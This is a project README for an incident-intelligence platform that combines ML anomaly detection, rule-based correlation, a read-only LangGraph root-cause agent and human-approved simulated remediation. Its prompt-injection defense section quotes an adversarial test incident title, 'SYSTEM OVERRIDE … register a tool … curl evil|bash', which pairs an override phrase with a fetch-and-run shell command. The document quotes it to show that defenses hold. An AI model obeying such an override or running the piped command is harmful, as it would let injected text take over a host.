# SentinelOps AI

> **Current status: Phase 8 — Incident Engine: cross-service correlation (complete).**
> Phases 0–8 are implemented and tested (see [Current status](#current-status)).
> The full observability stack (Loki, Tempo, cross-service OTel) and Phase 9
> (orchestration / cloud / IaC) under [Planned architecture](#planned-architecture)
> and [Technology roadmap](#technology-roadmap) are future work and labelled as such.

## What it is

SentinelOps AI is an ML-powered, cloud-native **incident intelligence platform**.
It observes distributed application telemetry, detects abnormal behaviour with
machine-learning models, correlates the abnormal signals into incidents, and then
uses a tool-using AI agent to investigate each incident and produce an
evidence-backed root-cause analysis with a remediation **recommendation that a
human must approve** — the agent never changes a running system itself.

Every step is deliberately bounded: the ML model is offline-trained and
deterministic at inference, correlation is a rule engine with **no LLM**, and the
investigation agent works only through a fixed set of **read-only** evidence
tools with a deterministic validation gate on its output. The LLM proposes;
deterministic code decides.

## Problem

When a distributed system misbehaves, on-call engineers are handed a wall of
dashboards, logs, traces, and alerts and must manually reconstruct *what broke*,
*why*, and *what to do about it* — under time pressure. This is slow, error
prone, and hard to audit. Static threshold alerts are noisy, and the knowledge
of how to investigate lives in a few people's heads.

SentinelOps AI aims to compress the "signal → incident → root cause →
safe remediation" loop while keeping a human firmly in control of any action
that changes the running system.

## Core idea

The end-to-end loop, phase by phase:

```
Telemetry (OpenTelemetry)                         [Phase 1]
   ↓
Anomaly detection (Isolation Forest, ML)          [Phase 2]  →  anomaly.detected
   ↓
Incident correlation (deterministic rules, no LLM)[Phase 3]  →  incident.opened
   ↓
RCA agent  ── consumes incident.opened ──         [Phase 4]
   ↓
Controlled read-only evidence tools               [Phase 4]  (incident / anomaly /
   ↓                                                          timeline / metrics / health)
LangGraph investigation (plan → collect →         [Phase 4]
   analyze → verify → synthesize → validate)
   ↓
Evidence-backed RCA report (schema-validated)     [Phase 4]
   ↓
Deterministic RCA→proposal mapping (closed        [Phase 5]  →  remediation.proposed
  action catalogue) + LLM-free policy engine      [Phase 5]  →  remediation.policy_evaluated
   ↓
Explicit human approval (identity + role + reason)[Phase 5]  →  remediation.approved
   ↓
Allow-listed LocalSimulationExecutor              [Phase 5]  →  remediation.execution_succeeded
   ↓
Append-only audit trail + recovery verification   [Phase 5]  →  remediation.recovered
```

Two responsibilities are kept **separate on purpose** — an LLM API call is *not*
the ML component ([ADR-002](docs/decisions/adr-002-ml-and-llm-separation.md)):

- **Machine learning** detects anomalies in telemetry whose feature space matches
  the live system. It is offline-trained and deterministic at inference.
- **The AI agent** investigates an already-detected, already-correlated incident,
  reasons over evidence it collected through read-only tools, and *proposes* a
  root cause and a remediation category. It never detects, never correlates, and
  never executes.

## Planned architecture

> Target design. **Phases 0–8 exist and are tested** (the Kafka backbone,
> `orders-service`, live anomaly detection, incident correlation + PostgreSQL,
> the LangGraph RCA agent, human-approved remediation with audit + recovery
> verification, the MLflow-backed MLOps lifecycle, real-time inference
> observability with Prometheus + Grafana, and cross-service incident
> correlation). The full observability stack (Loki, Tempo, cross-service OTel
> collection) and orchestration / cloud / IaC (Phase 9) are future work. See
> [Current status](#current-status).

```mermaid
flowchart LR
  subgraph Sources["Instrumented services"]
    S1[orders-service]
    S2["more services (later)"]
  end

  S1 & S2 -->|OpenTelemetry| COL["OTel Collector / Alloy (later)"]
  COL --> OBS[("Loki / Tempo (later)")]
  S1 -->|metrics scrape| AD["anomaly-detector (ML)"]
  AD -->|/metrics OTel→Prom| PROM[("Prometheus + Grafana (Phase 7)")]

  AD -->|anomaly.detected| K[(Apache Kafka)]
  K --> CORR["incident-correlator (rules)"]
  CORR -->|incidents + evidence| DB[(PostgreSQL)]
  CORR -->|incident.opened| K

  K --> AGENT["rca-agent (LangGraph)"]
  AGENT -->|read-only, allow-listed| TOOLS["Evidence tools:<br/>incident, anomaly, timeline,<br/>related, metrics, health"]
  AGENT -->|Incident API over HTTP| CORR
  AGENT -->|RCAReport| DB
  AGENT --> API["Investigation API<br/>POST /investigations, GET /investigations/id"]

  API --> REM["remediation-controller (Phase 5):<br/>RCA→proposal mapping, LLM-free policy engine"]
  REM --> HUMAN{"Explicit human approval<br/>(identity + role + reason)"}
  HUMAN -->|approved| ACT["LocalSimulationExecutor<br/>(allow-listed, no real infra)"]
  ACT --> AUDIT[("Append-only audit trail<br/>(PostgreSQL)")]
  AUDIT --> VERIFY["Recovery verification<br/>(deterministic, observe-only)"]
  VERIFY -->|remediation.events| K

  MLF["MLflow (Phase 6)"] -.model aliases.-> AD
```

## Technology roadmap

Introduced **only in the phase that needs it**, never earlier:

| Area | Direction |
| --- | --- |
| Backend | Python, FastAPI |
| ML | scikit-learn, pandas, NumPy; XGBoost / PyTorch only if justified (not used) |
| MLOps | MLflow (experiment tracking + model registry with **aliases, not stages**); PSI drift detection; a deterministic promotion gate + retraining workflow ([Phase 6](#phase-6--mlops-lifecycle-done)) |
| ML inference observability | OpenTelemetry → Prometheus metrics for the inference path, a detection-latency timeline, an enhanced `/ready`, and a 12-panel Grafana dashboard ([Phase 7](docs/architecture/phase-7.md)) |
| AI agent | LangGraph (or an equivalent explicit state-machine agent), an LLM API, tool calling |
| Data | PostgreSQL; Redis where justified |
| Messaging | Apache Kafka (event backbone) |
| Observability | OpenTelemetry + Prometheus + Grafana (live, Phase 7); Loki, Tempo, Alloy/OTel-collection later (not Promtail) |
| Datasets | HDFS, BGL, NAB for offline experimentation/evaluation — evaluated **separately** from live synthetic telemetry ([ADR-004](docs/decisions/adr-004-datasets-vs-live-telemetry.md)) |
| Containers | Docker, Docker Compose |
| Orchestration | Kubernetes |
| Cloud | AWS |
| IaC | Terraform |
| CI/CD | GitHub Actions |
| Frontend | React / Next.js (or another justified modern choice) |
| Testing | pytest, integration tests, later load testing |

## Project phases

| Phase | Focus | State |
| --- | --- | --- |
| **0** | Repository & development foundation | **done** |
| **1** | Event backbone (Kafka) + a first instrumented service emitting telemetry | **done** |
| **2** | ML anomaly-detection pipeline + offline evaluation (real metrics) | **done** |
| **3** | Incident correlation + persistence (deterministic rules, PostgreSQL, Incident API) | **done** |
| **4** | AI RCA agent — LangGraph investigation, controlled read-only evidence tools, mock/live LLM boundary, Investigation API | **done** |
| **5** | Human-approved, allow-listed remediation — closed action catalogue, LLM-free policy engine, human approval workflow/API, `LocalSimulationExecutor`, append-only audit trail, recovery verification, `remediation.events` Kafka lifecycle events | **done** |
| **6** | MLOps lifecycle — MLflow experiment tracking + model registry, alias-based promotion (`champion`/`candidate`) through a deterministic gate, registry-backed inference, PSI drift detection, reproducible retraining workflow | **done** |
| **7** | Real-Time ML Inference Observability — Prometheus metrics for the inference path, detection-latency timeline, enhanced `/ready`, 12-panel Grafana dashboard | **done** |
| **8** | Incident Engine — cross-service correlation via a static service-dependency graph; `incident_relations` table; linked incidents on the Incident API | **done** |
| 9 | Kubernetes, cloud (AWS), Terraform, hardened CI/CD | planned |

The roadmap is a direction, not a contract; later phases may re-scope earlier
ones. See [docs/phases/roadmap.md](docs/phases/roadmap.md).

## Development

> Every command below works today. Prerequisites: Python 3.12+ (dev machine
> uses 3.14), Git, Docker Desktop (Kafka + PostgreSQL).

```bash
# 1. Virtual environment + dependencies
python -m venv .venv
source .venv/Scripts/activate      # Windows Git Bash;  .venv/bin/activate on Unix
pip install -e ".[dev,ml,incident,detector,rca,remediation]"
cp .env.example .env

# 2. The full pipeline (Phases 1 + 3 + 4 + 5): Kafka, PostgreSQL, orders-service,
#    anomaly-detector, incident-correlator, rca-agent, remediation-controller
#    (+ three one-shot migrations)
docker compose up --build -d
python scripts/generate_traffic.py --scenario sequence --duration 40 --rate 6
curl -s http://localhost:8002/incidents | python -m json.tool            # the correlated incident
INC=$(curl -s http://localhost:8002/incidents | python -c "import sys,json;print(json.load(sys.stdin)[0]['id'])")
curl -s "http://localhost:8004/incidents/$INC/investigation" | python -m json.tool  # the RCA the agent produced

# 3. Deterministic demos — no Kafka, no DB, no LLM API key
make incident-scenario        # Phase 3: anomalies -> ONE incident
make rca-scenario             # Phase 4: one incident -> investigation -> validated RCA
make rca-e2e-scenario         # Phase 4: incident.opened envelope -> consumer -> RCA -> API
make remediation-e2e-scenario # Phase 5: incident -> RCA -> approve -> simulated execute
                              #          -> audit -> recovery verify -> lifecycle events

# 4. Phase 2 ML: reproduce every experiment on the committed datasets
make ml-experiments        # -> artifacts/reports/ + summary.md

# 5. Phase 6 MLOps: the whole lifecycle in one deterministic run (sqlite, no server)
make phase6-demo           # train champion -> register -> drift -> retrain -> gate -> promote
```

`rca-agent` (`:8004`) defaults to `RCA_MODE=mock` — the whole chain runs with
**no LLM API key**. For a real provider: `RCA_MODE=live LLM_PROVIDER=anthropic
LLM_API_KEY=sk-ant-... docker compose up rca-agent` (the key is read from your
shell, never committed).

With `make` (Git Bash): `make install`, `make compose-up`, `make db-migrate`,
`make db-migrate-rca`, `make run-correlator`, `make run-rca`, `make ml-experiments`,
`make check`. Full instructions incl. PowerShell in
[docs/development/setup.md](docs/development/setup.md).

## Testing

```bash
pytest                                                    # all unit tests — or: make test
make ml-test                                               # just the ML suite
pytest tests/rca_agent -q                                  # just the RCA-agent suite
docker compose up -d kafka postgres && make db-migrate && make db-migrate-rca && \
  make test-integration                                   # real Kafka + PostgreSQL integration tests
```

Tests live in [tests/](tests/): platform API smoke tests,
[tests/orders_service/](tests/orders_service/) (order validation, event schema,
publisher, failure injection, instrumentation, a Kafka round-trip),
[tests/ml/](tests/ml/) (parsing, feature causality & no-leakage, splits,
detectors, inference, metrics, an experiment repro check, and the **Phase 6
MLOps** suite — MLflow tracking/registry/promotion gate, PSI drift, the
retraining workflow, and an end-to-end lifecycle demo, all against a local
sqlite MLflow store),
[tests/incident_correlator/](tests/incident_correlator/) (correlation, severity,
state machine, SQL repository, a Kafka→Postgres integration test), and
[tests/rca_agent/](tests/rca_agent/) (tool registry & bounds, the LangGraph
engine, mock + Anthropic LLM boundary, prompt-injection defenses, the Kafka
consumer & idempotency, the Investigation API, an outcome-class RCA harness, and
a real Kafka+Postgres end-to-end test).

## Environment variables

`.env.example` is the documented template of every supported variable, grouped by
prefix (`APP_`, `KAFKA_`, `DB_`, `DETECTOR_`, `RCA_`, `LLM_`, `MLFLOW_`, …). Copy
it to `.env` (git-ignored) for local development. Every service reads its config
through a typed `pydantic-settings` object — no code reads `os.environ` directly,
and `LLM_API_KEY` is a `SecretStr` that is never logged or serialised.
`MLFLOW_TRACKING_URI` is empty by default — the ML pipeline and the
anomaly-detector then behave exactly as in Phases 2–5.

## Security principles

- **No secrets in Git.** `.env` is ignored; only `.env.example` (placeholders) is
  committed. `LLM_API_KEY` is read from the environment at runtime, held as a
  `SecretStr`, and passed only to the provider SDK.
- **Least privilege.** Containers run as a non-root user.
- **Controlled tools.** The RCA agent obtains **all** evidence through a fixed,
  closed registry of **read-only** tools — it cannot add a tool, name a new one,
  issue an arbitrary HTTP/SQL/shell call, or point a tool at an arbitrary host
  ([ADR-020](docs/decisions/adr-020-controlled-read-only-evidence-tools.md)).
- **The LLM is not authoritative.** It proposes plans, findings, and a synthesis;
  deterministic code owns the tool allow-list, argument validation, resource
  limits, evidence ids, state transitions, and a `validate_report` gate on the
  output. Evidence (incident text, telemetry, tool output) is treated as **data,
  never instructions** — prompt-injection payloads inside it are quarantined and
  change nothing ([ADR-021](docs/decisions/adr-021-llm-boundary-and-injection-defense.md)).
- **Human approval for remediation.** Phase 4 produces only a structured
  *recommendation* (`requires_human_approval = true`, a closed action-category
  enum, **no executor anywhere**). No automated change to a running system
  ([ADR-003](docs/decisions/adr-003-human-in-the-loop-remediation.md)).
- **No hidden reasoning persisted.** The operational trace records concise
  actions and results, never private model chain-of-thought.

## Current status

### Phase 0 — Repository & Development Foundation *(done)*

Repo structure and docs (README, architecture overview, ADRs, setup, roadmap);
`pyproject.toml`; the platform API skeleton (`apps/api/sentinelops_api`) with
`GET /health` and `GET /`; Ruff + mypy (strict) + pytest; `Makefile`,
`Dockerfile`, `docker-compose.yml`, `.env.example`, GitHub Actions CI.

### Phase 1 — Event backbone + first instrumented service *(done)*

- **Kafka event backbone** — single-node KRaft broker in Docker Compose; topic
  `orders.events`; a versioned `order.created` event envelope
  ([docs/architecture/events.md](docs/architecture/events.md),
  [ADR-006](docs/decisions/adr-006-kafka-local-deployment-and-client.md)).
- **`orders-service`** (`apps/orders-service`) — a demo app under observation:
  `POST /orders` creates an order and synchronously publishes its event
  ([ADR-010](docs/decisions/adr-010-phase1-synchronous-publish.md)); also
  `GET /orders/{id}`, `/health`, `/ready`, `/metrics`.
- **OpenTelemetry instrumentation** — HTTP + business spans; Prometheus-scraped
  metrics (with a deliberate low-cardinality label policy); structured JSON logs
  carrying `trace_id`/`span_id`
  ([ADR-007](docs/decisions/adr-007-opentelemetry-instrumentation-standard.md),
  [ADR-008](docs/decisions/adr-008-events-vs-telemetry.md)).
- **Trace correlation into events** — `traceparent` injected into Kafka headers;
  a demo consumer continues the trace.
- **Controlled failure injection** (dev-only, disabled by default,
  [ADR-009](docs/decisions/adr-009-controlled-failure-injection.md)) + a
  **traffic generator** for reproducible telemetry scenarios
  ([docs/development/telemetry-scenarios.md](docs/development/telemetry-scenarios.md)).

Details: [docs/architecture/phase-1.md](docs/architecture/phase-1.md).

### Phase 2 — ML anomaly detection + offline evaluation *(done)*

The `ml/` subsystem — an offline training/evaluation pipeline. Phase 3's
`anomaly-detector` service wraps the trained model in a live
scrape → score → publish loop.

- **Track A dataset** — built by scraping `orders-service` `/metrics` every 10 s
  under a seeded sequence of fault scenarios; counter deltas → per-window rate
  signals; ground-truth labels kept separate; boundary/reset windows dropped
  ([ADR-011](docs/decisions/adr-011-ml-dataset-via-metrics-scraping.md)). Two
  canonical runs committed as small CSVs.
- **Feature engineering** — 23 causal features (rates, latency percentiles,
  rolling mean/std, deltas, growth rate); *one* implementation shared by
  training and streaming inference, with a test that they agree row-for-row and
  a test that no injected-fault ground truth leaks in.
- **Leak-safe splits** — chronological train/val/test, plus a held-out-fault
  split (train on latency+error faults, test on publish-failure+surge).
- **Detectors** — robust median/MAD z-score **baseline**; **Isolation Forest**
  primary ([ADR-012](docs/decisions/adr-012-isolation-forest-primary-detector.md));
  supervised Random Forest comparator. Shared `fit / score / predict / save /
  load` interface.
- **Evaluation** — window-wise precision/recall/F1/FPR/FNR/PR-AUC/confusion plus
  event-wise detection delay and false-alarms-per-hour.
- **Experiments 1-6** — baseline, IF, three-way comparison, held-out fault, and
  the same methodology on the independent **NAB** benchmark (downloaded, not
  committed — [ADR-013](docs/decisions/adr-013-nab-benchmark-track.md)). Results
  in `artifacts/reports/`.
- **Phase 3 boundary** — `ml.inference.DetectorService.score_window(signals) →
  AnomalyResult`.

Details + all measured numbers: [docs/architecture/phase-2.md](docs/architecture/phase-2.md).

### Phase 3 — Incident correlation + persistence *(done)*

- **`libs/sentinelops_common/`** — shared plumbing extracted from `orders_service`:
  the Kafka event envelope + versioned payload contracts, JSON logging + OpenTelemetry
  setup, a JSON producer, and an idempotent consumer.
- **`anomaly-detector`** (`services/anomaly-detector`) — the Phase 2 → 3 handoff.
  Scrapes `orders-service` `/metrics` every 10 s, rebuilds each telemetry window
  with the Phase 2 code, scores it with the Isolation Forest model (trained once
  at startup from committed data, fixed seed), and publishes `anomaly.detected`.
- **`incident-correlator`** (`services/incident-correlator`) — consumes
  `anomaly.detected` and groups related anomalies for a service into one
  **incident** with **deterministic, explainable** rules: a correlation key
  (`service:environment`) plus a configurable time window — **no LLM**
  ([ADR-015](docs/decisions/adr-015-deterministic-anomaly-correlation.md)).
  Severity is a deterministic rule engine (INFO…CRITICAL), every firing rule
  recorded.
- **PostgreSQL** (SQLAlchemy 2.0 async + Alembic —
  [ADR-014](docs/decisions/adr-014-postgresql-for-incident-state.md)) — incidents,
  evidence, and an append-only state-transition history. A partial unique index
  enforces one active incident per key; `event_id` uniqueness makes replays
  idempotent. Offset committed only after the DB transaction
  ([ADR-016](docs/decisions/adr-016-idempotent-kafka-consumer.md)); poison
  messages go to `anomaly.events.dlq`.
- **Incident API** (`:8002`, internal) — list/detail/evidence/history with
  filters, plus acknowledge / resolve / transition against an explicit state
  machine ([ADR-017](docs/decisions/adr-017-incident-state-machine.md)).
  `incident.*` lifecycle events are published for Phase 4.

Details: [docs/architecture/phase-3.md](docs/architecture/phase-3.md) ·
[docs/architecture/incident-model.md](docs/architecture/incident-model.md).

### Phase 4 — AI RCA / investigation agent *(done)*

- **`rca-agent`** (`services/rca-agent`, `:8004`) — a separate service (it
  depends on an external LLM API and must not share a failure domain with
  correlation — [ADR-019](docs/decisions/adr-019-rca-agent-service-and-boundary.md)).
  It consumes `incident.opened` from Kafka and, per incident, runs one bounded
  investigation. It reads incidents through the Phase 3 **Incident API over
  HTTP**, never that service's database, and owns its own PostgreSQL tables with
  a separate Alembic lineage (`alembic_version_rca`).
- **Controlled read-only evidence tools** — a fixed, closed registry:
  `get_incident`, `get_incident_timeline`, `get_anomaly_evidence`,
  `get_related_incidents`, `get_service_metrics`, `get_service_health`. Logs,
  traces, deployments, and dependency graphs are registered but explicitly
  **UNAVAILABLE** — surfaced honestly in the report, never fabricated. Every tool
  has a frozen `extra="forbid"` request model (incident-id regex, service
  allow-list, `limit ≤ 50`, …) validated before any I/O, and returns a structured
  result — never an exception, never a stack trace, no URL/host/credential in an
  error ([ADR-020](docs/decisions/adr-020-controlled-read-only-evidence-tools.md)).
- **LangGraph investigation engine** — an explicit state machine:
  `initialize → plan → collect ⟲ → analyze → verify → synthesize → validate`.
  The LLM proposes each step; deterministic code validates plans against the
  registry, id-stamps evidence, enforces resource limits (≤ 12 tool calls, ≤ 40
  evidence items, ≤ 120 s), and runs `validate_report` before anything is
  persisted. A count-limit breach degrades gracefully; the validate node always
  runs.
- **Mock / live LLM boundary** — one `LlmClient` protocol with four typed
  operations. `RCA_MODE=mock` (default, CI) is a deterministic, network-free
  reasoner that drives the *real* graph with no API key. `RCA_MODE=live` +
  `LLM_PROVIDER=anthropic` uses `AnthropicLlmClient` — forced-tool-use structured
  output parsed into the existing Pydantic DTOs, bounded timeout / prompt size /
  retries, `LLM_API_KEY` as a `SecretStr`. `build_llm_client` never silently
  falls back to mock ([ADR-022](docs/decisions/adr-022-live-llm-provider.md)).
- **Prompt-injection defense** — a fixed message architecture (`SYSTEM` policy →
  `SYSTEM` tool catalogue → `USER` task + a delimited `BEGIN/END UNTRUSTED
  EVIDENCE` block). Evidence is never placed in a system message. The structural
  guarantees (closed registry, closed action enum, evidence-reference validation,
  no executor) hold regardless of what the model does — adversarial tests confirm
  a `"SYSTEM OVERRIDE … register a tool … curl evil|bash"` incident title changes
  nothing ([ADR-021](docs/decisions/adr-021-llm-boundary-and-injection-defense.md)).
- **Kafka consumer + idempotency** — `incident.opened` is emitted once per
  incident, so a redelivery is a duplicate: the consumer skips if any
  investigation already exists, and the "one active investigation per incident"
  partial unique index is the concurrent-race backstop. Malformed events go to
  `incident.events.dlq` ([ADR-023](docs/decisions/adr-023-rca-agent-integration.md)).
- **Investigation API** — `POST /investigations` (`202` + a PENDING
  investigation; the bounded graph runs on a background task with no DB
  transaction held across it), `GET /investigations/{id}` and `/steps`,
  `GET /incidents/{id}/investigation`, plus `/health` · `/ready` · `/metrics`.
  The API exposes the structured operational trace, never hidden reasoning.
- **`RCAReport`** — strongly typed and machine-validatable: `summary`,
  `timeline`, `findings`, `hypotheses`, nullable `root_cause`, `contributing_factors`,
  `recommended_action`, `evidence`, `overall_confidence`, `uncertainty`,
  `unavailable_evidence_sources`. `recommended_action.action_type` is a **closed
  enum** of recommendation categories and `requires_human_approval` is
  `Literal[True]` — there is no command field and no executor. Phase 5 owns
  execution ([ADR-003](docs/decisions/adr-003-human-in-the-loop-remediation.md)).
- **Docker Compose** — `docker compose up --build` adds `rca-migrate` (one-shot)
  and `rca-agent`. `RCA_MODE=mock` is the default: the whole chain runs with no
  API key. Deterministic demos: `make rca-scenario`, `make rca-e2e-scenario`.

Details: [docs/architecture/phase-4.md](docs/architecture/phase-4.md).

### Phase 5 — Human-approved remediation *(done)*

- **`remediation-controller`** (`services/remediation-controller`, `:8005`) — a
  separate service that turns a Phase 4 RCA recommendation into typed *intent* a
  human must approve. **AI recommendation ≠ execution authority** — the rca-agent
  never gains a write path
  ([ADR-003](docs/decisions/adr-003-human-in-the-loop-remediation.md),
  [ADR-024](docs/decisions/adr-024-remediation-domain-and-action-catalogue.md)).
- **Closed action catalogue (5A)** — `RemediationActionType` is a closed enum
  (`RESTART_SERVICE`, `SCALE_SERVICE`, `ROLL_BACK_DEPLOYMENT`,
  `DISABLE_FEATURE_FLAG`); there is no `EXECUTE_COMMAND` / `RUN_SHELL` member by
  construction. `RemediationProposal` is `extra="forbid"` with no command-shaped
  field, `requires_approval: Literal[True]`, a code-defined immutable catalogue,
  and a `{"orders-service"}` target allow-list that fails closed.
  `proposal_from_rca` is the only path from a recommendation to a proposal —
  deterministic, total, and fail-closed to a terminal `BlockedProposal`.
- **Deterministic policy engine (5B)** — a 9-rule, **LLM-free** `PolicyEngine`
  (state · action · target · environment · severity · parameters ·
  risk/blast-radius from the catalogue · expiry · cooldown) returning a
  structured `PolicyDecision`; a policy `ALLOW` only reaches `PENDING_APPROVAL`
  ([ADR-025](docs/decisions/adr-025-deterministic-remediation-policy-engine.md)).
- **Persistence + human approval workflow/API (5C)** — its own Alembic lineage
  (`alembic_version_remediation`) in the shared database; `POST /remediations`,
  `GET`, `POST …/approve|reject` with a deterministic role→catalogue-risk
  authorization matrix; immutable `remediation_approvals` rows
  (`UNIQUE(remediation_id)`); concurrency-safe (`SELECT … FOR UPDATE`)
  ([ADR-026](docs/decisions/adr-026-remediation-persistence-and-approval-workflow.md)).
- **Allow-listed `LocalSimulationExecutor` (5D)** — `POST /remediations/{id}/execute`
  runs an `APPROVED` remediation through a typed executor
  (`APPROVED → EXECUTING → EXECUTED | EXECUTION_FAILED`); `{"dry_run": true}`
  previews with zero side effects. **No `subprocess` / Docker / Kubernetes / SSH
  / cloud SDK anywhere** (AST-enforced) — a local simulation only
  ([ADR-027](docs/decisions/adr-027-allow-listed-executor-and-local-simulation.md)).
- **Append-only audit trail (5E)** — one immutable `remediation_audit_events`
  row per committed lifecycle fact, written **in the same transaction** as the
  transition; four-layer append-only enforcement (no write API, no repo mutation
  path, app-appends-only, a PostgreSQL `BEFORE UPDATE OR DELETE` trigger); a
  secret-redaction boundary on every stored value; read-only
  `GET /remediations/{id}/audit`
  ([ADR-028](docs/decisions/adr-028-append-only-remediation-audit-trail.md)).
- **Recovery verification (5F)** — `EXECUTED → VERIFYING → RECOVERED |
  RECOVERY_FAILED` via a deterministic, **observe-only** `RecoveryVerifier`: a
  bounded virtual-clock poll loop over a `HealthProbe`, evaluated against the
  verifier's *own* thresholds, never an LLM. `POST /remediations/{id}/verify-recovery`
  (no body fields); idempotent replay
  ([ADR-029](docs/decisions/adr-029-recovery-verification.md)).
- **Kafka lifecycle events (5G)** — after each committed transition the service
  publishes a versioned `RemediationLifecycleV1` event onto `remediation.events`
  (keyed by `remediation_id`), best-effort **after the transaction commits**
  (same model as `incident.events`; no transactional outbox). It **consumes no
  topic** — Kafka is never an execution channel. A deterministic `event_id`
  (`uuid5` of the audit-row id) lets consumers dedupe a republish
  ([ADR-030](docs/decisions/adr-030-remediation-lifecycle-events.md)).
- **Docker Compose** — `docker compose up --build` adds `remediation-migrate`
  (one-shot) and `remediation-controller`, wired to Kafka + PostgreSQL.
  Deterministic demo: `make remediation-e2e-scenario` (incident → RCA → approve →
  simulated execute → audit → recovery verify → lifecycle events).

Details: [docs/architecture/phase-5.md](docs/architecture/phase-5.md).

### Phase 6 — MLOps lifecycle *(done)*

Turns the Phase 2 detector from *"we trained a model"* into a **reproducible,
versioned, observable ML lifecycle** — the Phase 2 evaluation methodology stays
authoritative; MLflow *records* it, never replaces it.

- **Experiment tracking (6A)** — `ml/mlops/tracking.py`: `run_experiment` mirrors
  each model's run into MLflow (params, hyperparameters, real `ml.evaluation`
  metrics, artifacts, and a reproducibility lineage block — git SHA, Python +
  library versions). Additive and fail-safe; the offline pipeline is unchanged
  when `MLFLOW_TRACKING_URI` is unset. Local server via Docker Compose (`mlflow`
  + one-shot `mlflow-init`, Postgres backend store, HTTP-served artifacts,
  `http://localhost:5000`) — nothing in Phases 1–5 depends on it
  ([ADR-031](docs/decisions/adr-031-mlflow-tracking-and-registry.md)).
- **Model registry + alias promotion (6B)** — `ml/mlops/registry.py` registers
  each bundle as an MLflow **model version** and manages the `candidate` /
  `champion` / `previous-champion` **aliases** (never deprecated stages —
  [ADR-032](docs/decisions/adr-032-model-alias-strategy.md)). `ml/mlops/promotion.py`
  is the deterministic gate: `evaluate_candidate` (pure, no LLM) checks F1 /
  recall / PR-AUC floors grounded in the committed Phase 2 numbers plus a
  no-F1-regression guard vs the champion; a failing candidate stays `candidate`
  ([ADR-033](docs/decisions/adr-033-model-promotion-criteria.md)). CLI:
  `python -m ml.mlops {register,promote,list-models,get-champion}`.
- **Registry-backed inference (6C)** — `DetectorService.from_registry` resolves
  the `champion` alias and loads that version with the **existing**
  `AnomalyDetector.load` (no `mlflow.pyfunc`/`sklearn` flavors). The
  `anomaly-detector` service resolves it once at startup when
  `MLFLOW_TRACKING_URI` is set (cached); `MLFLOW_REQUIRED=true` → `/ready`
  reports 503 if the registry is down, `=false` → explicit `local-fallback`.
  `/ready` and `/model-info` report `model_source` / `model_version`. Unset →
  behaves exactly as Phases 3–5.
- **Drift detection (6D)** — `ml/monitoring/`: `freeze_baseline` snapshots a
  model's **training** feature distribution (per-feature quantile bins + stats,
  labels excluded) and stores it with the champion; `detect_drift` compares a
  window of **production** features against it with the **Population Stability
  Index** (standard `<0.1 / 0.1–0.25 / ≥0.25` bands, overall = most severe).
  Prediction drift is a separate field; drift ≠ degradation
  ([ADR-034](docs/decisions/adr-034-drift-detection-methodology.md)). CLI:
  `python -m ml.monitoring {baseline,check}`.
- **Reproducible retraining (6E)** — `ml/mlops/retraining.py`:
  `python -m ml.mlops retrain --dataset run_a [--seed N] [--promote-if-passing]`
  reuses the whole Phase 2 pipeline (load → split → features → train → calibrate
  on validation → evaluate on test), logs + registers, and runs the 6B gate.
  Deterministic (same dataset + seed → identical metrics). Promotion is **opt-in**
  and still gated — no autonomous deployment, no scheduler.
  `scripts/drift_triggered_retraining.py` and `scripts/phase6_e2e_demo.py` show
  the full loop.

Details: [docs/architecture/phase-6.md](docs/architecture/phase-6.md) ·
[docs/phase6-summary.md](docs/phase6-summary.md). Try it:
`MLFLOW_TRACKING_URI=sqlite:///mlruns/mlflow.db make phase6-demo`.

### Phase 7 — Real-Time ML Inference Observability *(done)*

The anomaly-detector's scrape → score → publish loop goes from a black box to a
fully observed path. No detection logic changed; every number is from a real run.

- **Prometheus inference metrics (7A)** — `DetectorMetrics` gains an inference
  view recorded per scored window: `detector_inference_requests_total`,
  `detector_inference_duration_seconds` (real sub-second buckets),
  `detector_anomalies_detected_total`, `detector_anomaly_score` distribution, and
  observable `detector_model_{version,type,info}` gauges. Exported at
  `GET /metrics` via the OTel → Prometheus exporter (ADR-007) — service name is a
  resource attribute, `model_version` the only per-metric label.
- **Detection-latency timeline (7B)** — `anomaly_detector/timing.py` keeps a
  per-cycle `DetectionTimeline` (scrape → window-close → inference → publish) and
  derives `detector_window_age_at_scrape_seconds`,
  `detector_scrape_to_publish_seconds`, and
  `detector_detection_latency_end_to_end_seconds`. The same breakdown rides on
  the `anomaly.detected` payload (`detection_latency_ms` / `scrape_latency_ms` /
  `inference_latency_ms`) — debug metadata, never correlation logic.
- **Enhanced `/ready` (7C)** — a thread-safe `DetectorState` rollup
  (`inference_stats`: counts, anomaly rate, EMA / min / max latency, last
  inference time), `uptime_seconds`, and a soft `healthy` / `health_reasons`
  degradation signal (`HEALTH_` thresholds — never changes the HTTP status). The
  existing `status` / `model_*` fields are unchanged; `GET /ready/stats` returns
  just the rollup. Service-level aggregate metrics (`detector_service_*`) too.
- **Prometheus + Grafana (7D)** — `docker compose up` starts `prometheus`
  (`:9090`, scrapes the detector every 5 s) and `grafana` (`:3000`, `admin`/`admin`)
  with an auto-provisioned data source and a **12-panel** "Anomaly Detector —
  Inference & Performance" dashboard (`infrastructure/monitoring/`).
- **Verification (7E)** — `scripts/phase7_verify.py` (`make phase7-verify`)
  checks the whole surface in-process or `--url` against a live detector;
  `tests/infrastructure/` statically validates the dashboard + config.

Details: [docs/architecture/phase-7.md](docs/architecture/phase-7.md) ·
[docs/phase7-summary.md](docs/phase7-summary.md). Try it: `make phase7-verify`,
or `docker compose up` then open `http://localhost:3000`.

### Phase 8 — Incident Engine: cross-service correlation *(done)*

Completes the incident engine. Phase 3 built deterministic anomaly→incident
correlation, the PostgreSQL schema, the severity engine, the lifecycle state
machine, and the Incident API. Phase 8 adds the layer
[ADR-015](docs/decisions/adr-015-deterministic-anomaly-correlation.md) deferred:
**correlation across services**.

- **Static service-dependency graph** (`incident_correlator/topology.py`) —
  `SERVICE_DEPENDENCY_GRAPH = {"orders-service": ["payments-service",
  "inventory-service"]}`, overridable via the `SERVICE_DEPENDENCY_GRAPH` env var
  (JSON). Pure, tested helpers: `dependencies_of`, `dependents_of`,
  `related_services`, `incidents_overlap`, `find_related_incidents`,
  `correlate_incidents`. No topology discovery, no trace-derived edges — a
  static graph + a fixed window keeps linking reproducible.
- **Transactional linking** — `AnomalyProcessor._link_related_incidents` runs in
  the **same DB transaction** as the incident write, after every CREATE / APPEND
  / SUPERSEDE (never a DUPLICATE): one indexed query for active incidents in
  adjacent services, an interval-overlap check against
  `CROSS_SERVICE_CORRELATION_WINDOW_SECONDS` (default 600 s), then an
  `incident_relations` insert per edge — directed `dependent → dependency`, so
  the relation graph stays acyclic. Deduped and race-safe (rides the existing
  retry loop).
